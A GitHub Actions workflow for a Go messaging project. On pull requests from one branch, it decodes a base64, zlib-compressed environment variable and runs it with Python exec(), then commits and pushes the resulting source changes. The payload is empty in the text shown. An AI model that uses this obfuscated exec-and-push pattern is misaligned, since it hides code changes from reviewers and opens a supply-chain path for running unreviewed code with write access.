name: Harden messaging runtime integration

on:
  pull_request:
    branches:
      - main
    types:
      - opened
      - synchronize
      - reopened

permissions:
  contents: write

jobs:
  harden:
    if: github.head_ref == 'feat/messaging-runtime-routing-attempts' && github.actor != 'github-actions[bot]'
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout branch
        uses: actions/checkout@v7
        with:
          ref: feat/messaging-runtime-routing-attempts
          fetch-depth: 0

      - name: Set up Go
        uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true

      - name: Download dependencies
        run: go mod download

      - name: Apply runtime hardening
        env:
          PATCH_PAYLOAD: 
        run: |
          python - <<'PY'
          import base64
          import os
          import zlib

          source = zlib.decompress(base64.b64decode(os.environ['PATCH_PAYLOAD'])).decode()
          exec(compile(source, 'harden_messaging_runtime.py', 'exec'))
          PY

      - name: Format changed Go files
        run: |
          gofmt -w \
            internal/platform/messaging/routing \
            internal/delivery/messaging/routing \
            internal/delivery/email/outbound/repository.go \
            internal/platform/sms/service.go \
            internal/modules/sms/repository.go \
            internal/delivery/sms/outbound

      - name: Run focused tests
        run: |
          go test -race \
            ./internal/platform/messaging/routing \
            ./internal/delivery/messaging/routing \
            ./internal/platform/sms \
            ./internal/delivery/email/outbound \
            ./internal/delivery/sms/outbound \
            ./internal/modules/sms

      - name: Run vet and compile
        run: |
          go vet ./...
          go test -run '^$' ./...
          git diff --check

      - name: Commit runtime hardening
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add \
            internal/platform/messaging/routing \
            internal/delivery/messaging/routing \
            internal/delivery/email/outbound/repository.go \
            internal/platform/sms/service.go \
            internal/modules/sms/repository.go \
            internal/delivery/sms/outbound
          test -n "$(git status --porcelain)"
          git commit -m "fix: harden messaging runtime route attempts"
          git push origin HEAD:feat/messaging-runtime-routing-attempts
